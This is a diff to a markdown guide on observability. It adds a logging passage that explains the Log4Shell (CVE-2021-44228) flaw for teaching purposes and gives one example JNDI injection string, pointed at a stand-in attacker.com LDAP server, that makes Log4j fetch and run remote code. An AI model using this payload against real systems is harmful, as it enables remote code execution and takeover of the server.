@@ -54,9 +54,29 @@ There are exporters for many applications that do not have an easy way to add we
 
 # Pillar 3: Logs
 Logging involves recording discrete events within a system, such as incoming requests, database accesses, time taken to process the request and obviously errors.
-It typically generates high volumes of data. 
 
+In Java world, log4j is a standard, while similarly python provides id own logging module
+
+```
+Recently, the software development community was shaken by a significant security vulnerability associated with Apache Log4j, 
+
+This vulnerability, tracked as CVE-2021-44228, and commonly referred to as Log4Shell or Log4j vulnerability, exposed a critical security flaw that could potentially allow remote attackers to execute arbitrary code on affected systems, leading to serious security breaches.
+
+In essence, Log4Shell is a vulnerability that exploits Log4j's ability to dynamically interpret log messages, allowing attackers to inject and execute malicious code through seemingly harmless log entries.
+
+eg. if an attacker sends a simple message like logger.info("Hello ${jndi:ldap://attacker.com/evil}")
+It tells Log4j to look up a resource using JNDI (Java Naming and Directory Interface), specifically trying to connect to an LDAP server hosted by the attacker.
+The attacker, via controlling the LDAP server, can send back a response containing malicious code. Log4j, being unaware of the danger, would then execute this code, leading to potential security breaches, such as taking control of the system or accessing sensitive information.
+
+The severity of the Log4Shell vulnerability prompted immediate action from software vendors, organizations, and security researchers worldwide. The widespread adoption of Log4j across a myriad of applications and systems meant that the vulnerability posed a significant risk to a vast number of digital assets and infrastructure.
+
+In response to the Log4Shell threat, the Apache Software Foundation swiftly released patches and updates to address the vulnerability. Additionally, security advisories were issued, urging users to upgrade their Log4j installations to patched versions as soon as possible to mitigate the risk of exploitation.
+```
+
+
+As our applications, and microservices can generate a lot of logs, we often need to use an analysis platform to collate and query these logs
 The ELK stack (Elasticsearch, Logstash, Kibana) is commonly used to build log analysis platforms. 
+
 
 ### What is the ELK Stack?
 The ELK Stack began as a collection of three open-source products — Elasticsearch, Logstash, and Kibana — all developed, managed and maintained by Elastic. The introduction and subsequent addition of Beats turned the stack into a four legged project.
